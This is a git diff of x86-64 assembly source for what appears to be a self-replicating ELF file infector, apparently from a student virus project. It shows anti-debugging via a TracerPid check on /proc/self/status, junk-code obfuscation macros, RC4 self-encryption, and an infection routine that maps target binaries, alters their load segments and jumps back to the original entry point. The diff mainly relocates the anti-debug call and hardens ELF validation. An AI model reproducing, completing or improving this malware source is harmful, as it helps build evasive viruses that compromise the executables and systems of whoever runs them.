@@ -7,7 +7,7 @@ global _start
 _start:
 	PUSHAQ						; save original program params
 
-	call anti_debug
+;	call anti_debug
 
 	mov BYTE[rsp], 1			; with the PUSHAQ, BYTE[rsp] = r15
 
@@ -40,71 +40,6 @@ exit_debug:
 exit:
 	mov rax, EXIT
 	syscall
-
-anti_debug:
-	ENTER_OBF READ_BUF + 4
-
-	OBF3
-	mov rax, OPEN
-	lea rdi, [rel proc_status]
-	mov rsi, O_RDONLY
-	OBF1 0xcf
-	syscall
-	mov DWORD[rsp], eax				; fd = open("/proc/self/status", O_RDONLY)
-	cmp rax, 0						; if (fd < 0)
-	jl _ret							;	return
-
-	OBF2 0x0f
-	mov rax, READ
-	xor rdi, rdi
-	mov edi, DWORD[rsp]
-	lea rsi, [rsp + 4]
-	mov rdx, READ_BUF
-	syscall							; rd = read(fd, &rsp, PATH_MAX)
-
-	mov edi, DWORD[rsp]
-	MOV_OBF1 rax, CLOSE
-	syscall							; close(fd)
-
-	lea rdi, [rsp + 4]
-	lea rsi, [rel tracerpid]
-	mov rdx, READ_BUF
-	OBF1 0xcf
-	call anti_debug_strstr			; anti_debug_strstr(*rsp, "TracerPid\t", READ_BUF)
-	cmp al, 0x30
-	jne exit_debug
-
-	jmp _ret
-
-anti_debug_strstr:		; rdi = haystack;  rsi = needle;  rdx = len
-	ENTER_OBF 0
-
-	xor r8, r8												; int i = 0
-	anti_debug_strstr_while_haystack:						; while (i < len)
-		xor r9, r9											;	int j = 0
-		anti_debug_strstr_while_needle:						;	do
-			OBF_USELESS 0xcf
-			mov al, BYTE[rdi + r8]							;		char a = haystack[i]
-			mov bl, BYTE[rsi + r9]							;		char b = needle[j]
-			cmp bl, 0										;		if (b == '\0')
-			je _ret											;			return 0
-			cmp r8, rdx										;		if (i >= len)
-			jae anti_debug_strstr_while_haystack_increase	;			break
-			cmp al, bl										;		if (a != b)
-			jne anti_debug_strstr_while_haystack_increase	;			break
-			inc r8											;		i++
-			OBF2 0xcf
-			inc r9											;		j++
-			jmp anti_debug_strstr_while_needle				;	while (a == b)
-
-		anti_debug_strstr_while_haystack_increase:
-		sub r8, r9											;	i -= j
-		inc r8												;	i++
-		cmp r8, rdx
-		jb anti_debug_strstr_while_haystack
-
-	mov rax, 0x30		; return 0x30
-	jmp _ret
 
 rc4:					; rdi = &main;  rsi = len;  rdx = key;  r10 = ken_len
 	ENTER_OBF 0x110					; rsp = S[256]	(+16: security)
@@ -223,7 +158,10 @@ _ret:
 	ret
 
 main:
-	; check if le proc "test" is running
+	; check if the program is running in a debug
+	call anti_debug
+
+	; check if the proc "test" is running
 	OBF3
 	lea rdi, [rel proc_dir]
 	mov rsi, 1
@@ -248,7 +186,72 @@ main:
 exit_payload:			; REPERE! Ne pas modifier sinon modify_payload() est cassé
 	jmp 0xbbbbbbbb		; jump to the original entry of the infected program
 
-encryption:
+anti_debug:
+	ENTER_OBF READ_BUF + 4
+
+	OBF3
+	mov rax, OPEN
+	lea rdi, [rel proc_status]
+	mov rsi, O_RDONLY
+	OBF1 0xcf
+	syscall
+	mov DWORD[rsp], eax				; fd = open("/proc/self/status", O_RDONLY)
+	cmp rax, 0						; if (fd < 0)
+	jl _ret							;	return
+
+	OBF2 0x0f
+	mov rax, READ
+	xor rdi, rdi
+	mov edi, DWORD[rsp]
+	lea rsi, [rsp + 4]
+	mov rdx, READ_BUF
+	syscall							; rd = read(fd, &rsp, PATH_MAX)
+
+	mov edi, DWORD[rsp]
+	MOV_OBF1 rax, CLOSE
+	syscall							; close(fd)
+
+	lea rdi, [rsp + 4]
+	lea rsi, [rel tracerpid]
+	mov rdx, READ_BUF
+	OBF1 0xcf
+	call anti_debug_strstr			; anti_debug_strstr(*rsp, "TracerPid\t", READ_BUF)
+	cmp al, 0x30
+	jne exit_debug
+
+	jmp _ret
+
+anti_debug_strstr:		; rdi = haystack;  rsi = needle;  rdx = len
+	ENTER_OBF 0
+
+	xor r8, r8												; int i = 0
+	anti_debug_strstr_while_haystack:						; while (i < len)
+		xor r9, r9											;	int j = 0
+		anti_debug_strstr_while_needle:						;	do
+			OBF_USELESS 0xcf
+			mov al, BYTE[rdi + r8]							;		char a = haystack[i]
+			mov bl, BYTE[rsi + r9]							;		char b = needle[j]
+			cmp bl, 0										;		if (b == '\0')
+			je _ret											;			return 0
+			cmp r8, rdx										;		if (i >= len)
+			jae anti_debug_strstr_while_haystack_increase	;			break
+			cmp al, bl										;		if (a != b)
+			jne anti_debug_strstr_while_haystack_increase	;			break
+			inc r8											;		i++
+			OBF2 0xcf
+			inc r9											;		j++
+			jmp anti_debug_strstr_while_needle				;	while (a == b)
+
+		anti_debug_strstr_while_haystack_increase:
+		sub r8, r9											;	i -= j
+		inc r8												;	i++
+		cmp r8, rdx
+		jb anti_debug_strstr_while_haystack
+
+	mov rax, 0x30		; return 0x30
+	jmp _ret
+
+
 set_fingerprint:		; r8 = &fingerprint;  r9 = fingerprint_nb
 	ENTER 0
 
@@ -325,7 +328,7 @@ check_file:				; rdi = s_war  |  r8 = s_war;  r9 = ehdr
 	OBF3
 	mov rdi, QWORD[r8 + s_war.old_ptr_len]
 	cmp rdi, EHDR_SIZE								; if (s_war.old_ptr_len < EHDR_SIZE)
-	jl check_file_error								;	return 0
+	jb check_file_error								;	return 0
 
 	mov edi, DWORD[r9 + ehdr.ei_mag]
 	cmp edi, ELFMAG									; if (&ehdr->e_ident[0] != ".ELF")
@@ -338,7 +341,7 @@ check_file:				; rdi = s_war  |  r8 = s_war;  r9 = ehdr
 	OBF_USELESS 0xcf
 	mov dil, BYTE[r9 + ehdr.ei_data]
 	cmp dil, 2										; if (!ehdr->e_ident[EI_DATA] > 2)
-	jg check_file_error								;	return 0
+	ja check_file_error								;	return 0
 
 	mov dil, BYTE[r9 + ehdr.ei_version]
 	cmp dil, EV_CURRENT								; if (ehdr->e_ident[EI_VERSION] != EV_CURRENT)
@@ -367,16 +370,21 @@ check_file:				; rdi = s_war  |  r8 = s_war;  r9 = ehdr
 
 	mov di, WORD[r9 + ehdr.e_phnum]
 	cmp di, 1										; if (ehdr->e_phnum < 1)
-	jl check_file_error								;	return 0
+	jb check_file_error								;	return 0
 
 	mov di, WORD[r9 + ehdr.e_shentsize]
 	cmp di, SHDR_SIZE								; if (ehdr->e_shentsize != SHDR_SIZE)
 	jne check_file_error							;	return 0
 
 	OBF2 0xcf
-	mov rdi, QWORD[r9 + ehdr.e_shnum]
-	cmp rdi, 1										; if (ehdr->e_shnum < 1)
-	jl check_file_error								;	return 0
+	mov di, WORD[r9 + ehdr.e_shnum]
+	cmp di, 1										; if (ehdr->e_shnum < 1)
+	jb check_file_error								;	return 0
+
+	mov di, WORD[r9 + ehdr.e_shstrndx]
+	mov di, WORD[r9 + ehdr.e_shnum]
+	cmp di, SHDR_SIZE								; if (ehdr->e_shstrndx >= ehdr.e_shnum)
+	jae check_file_error							;	return 0
 
 	check_elf_phdr:
 	xor rax, rax
@@ -394,6 +402,16 @@ check_file:				; rdi = s_war  |  r8 = s_war;  r9 = ehdr
 
 	mov cx, WORD[r9 + ehdr.e_phnum]
 	check_elf_phdr_while:							; while ((cx = ehdr.e_phnum) > 0)
+		mov rdi, QWORD[r10 + phdr.p_offset]
+		mov rsi, QWORD[r8 + s_war.old_ptr_len]
+		cmp rdi, rsi
+		jae check_file_error						;	if (phdr->p_offset >= g_woody->old_ptr_len)
+		mov rdi, QWORD[r10 + phdr.p_filesz]
+		cmp rdi, rsi
+		jae check_file_error						;	if (phdr->p_filesz >= g_woody->old_ptr_len)
+		mov rdi, QWORD[r10 + phdr.p_memsz]
+		cmp rdi, rsi
+		jae check_file_error						;	if (phdr->p_memsz >= g_woody->old_ptr_len)
 		OBF_USELESS 0xcf
 		mov rdi, QWORD[r10 + phdr.p_offset]
 		add rdi, QWORD[r10 + phdr.p_filesz]
@@ -425,11 +443,22 @@ check_file:				; rdi = s_war  |  r8 = s_war;  r9 = ehdr
 	mul si
 	add rax, r10
 	mov rdi, QWORD[rax + shdr.sh_offset]
+	mov rsi, QWORD[r8 + s_war.old_ptr_len]
+	cmp rdi, rsi
+	jae check_file_error							; if (shdr[ehdr->e_shstrndx].sh_offset >= g_woody->old_ptr_len)
 	add rdi, r9
-	push rdi										; strtab = (char*)g_woody->ptr + shdr[ehdr->e_shstrndx].sh_offset
+	push rdi										; symtab = (char*)g_woody->ptr + shdr[ehdr->e_shstrndx].sh_offset
 
 	mov cx, WORD[r9 + ehdr.e_shnum]
 	check_elf_shdr_while:							; while ((cx = ehdr.e_shnum) > 0)
+		mov rdi, QWORD[r10 + shdr.sh_offset]
+		mov rsi, QWORD[r8 + s_war.old_ptr_len]
+		cmp rdi, rsi
+		jae check_file_error						;	if (shdr.sh_offset >= g_woody->old_ptr_len)
+		mov rdi, QWORD[r10 + shdr.sh_size]
+		cmp rdi, rsi
+		jae check_file_error						;	if (shdr.sh_size >= g_woody->old_ptr_len)
+		
 		mov rdi, QWORD[r10 + shdr.sh_offset]
 		OBF1 0xcf
 		add rdi, QWORD[r10 + shdr.sh_size]
@@ -514,7 +543,7 @@ find_data_section:		; r8 = s_war;  r9 = ehdr
 	find_data_section_set:
 	OBF3
 	mov QWORD[r8 + s_war.data_shdr], r10	; s_war.data_shdr = shdr
-	call is_infected							; is_infected()
+	call is_infected						; is_infected()
 	jmp _ret_obf
 
 modify_load_segments:	; r8 = s_war;  r9 = ehdr
@@ -883,6 +912,8 @@ infection:				; rdi = filename
 	mov QWORD[rsp + s_war.old_ptr_len], rax		; s_war.old_ptr_len = lseek(fd, 0, SEEK_END)
 	cmp rax, -1									; if (s_war.old_ptr_len == -1)
 	je infection_close							;	return;
+	cmp rax, 0x780000							; if (s_war.old_ptr_len > 0x780000) ; if the binary is too big the program segv when 'push s_war.ptr_len'
+	ja infection_close							;	return;
 
 	MOV_OBF1 rax, MMAP
 	mov rdi, 0
